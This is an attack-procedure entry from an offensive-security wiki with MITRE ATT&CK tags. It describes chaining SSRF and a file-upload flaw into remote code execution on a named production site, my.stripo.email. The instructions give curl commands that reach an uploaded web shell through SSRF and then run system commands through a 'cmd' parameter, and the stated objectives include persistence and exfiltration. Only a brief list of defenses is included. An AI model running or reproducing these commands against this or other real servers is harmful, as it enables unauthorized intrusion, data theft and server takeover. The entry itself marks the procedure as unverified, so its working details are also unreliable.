---
id: proc-uuid-3
tags:
  - rce
  - chain-exploit
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-rce-trigger]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T04:08:45.981Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques:
  - '[[Unix Shell]]'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Achieve-Remote-Code-Execution-via-Chained-Vulns

## Summary

This procedure chains SSRF and file upload exploits on https://my.stripo.email/ to achieve full remote code execution, allowing arbitrary commands on the server after payload deployment.

## Description

By first using SSRF to probe or access internal upload paths if firewalled, then uploading and triggering a web shell, attackers can execute system commands. This leads to server compromise, data exfiltration, or lateral movement. The critical impact stems from the combination enabling bypass of individual mitigations.

## Requirements

1. Successful SSRF and upload from prior procedures
2. Knowledge of uploaded file path
3. HTTP client for triggering

## Defense

Defensive measures and detection strategies:

- Implement WAF rules for SSRF and upload patterns
- Use runtime application self-protection (RASP) for code execution
- Monitor for anomalous command execution in web logs

## Objectives

1. Trigger uploaded payload for command execution
2. Confirm server control
3. Escalate to persistence or exfiltration

## Instructions

### Step 1: Locate Uploaded Payload

**Context**: Use SSRF if needed to access internal file paths.

**Command** ([[commands/curl-ssrf-payload]]):
```bash
curl -X POST 'https://my.stripo.email/api/internal' -d 'url=http://localhost/uploads/shell.php' -H 'Content-Type: application/json'
```

> Confirm file accessibility internally.

### Step 2: Trigger RCE

**Context**: Execute commands via the shell.

**Command** ([[commands/curl-rce-trigger]]):
```bash
curl 'https://my.stripo.email/uploads/shell.php?cmd=id'
```

> Output shows user ID, confirming execution; replace 'id' with any command.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques

- [[Unix Shell]]

## Commands Used

- [[commands/curl-rce-trigger]]

## Tools Used


## Tags

- rce
- vuln-chain
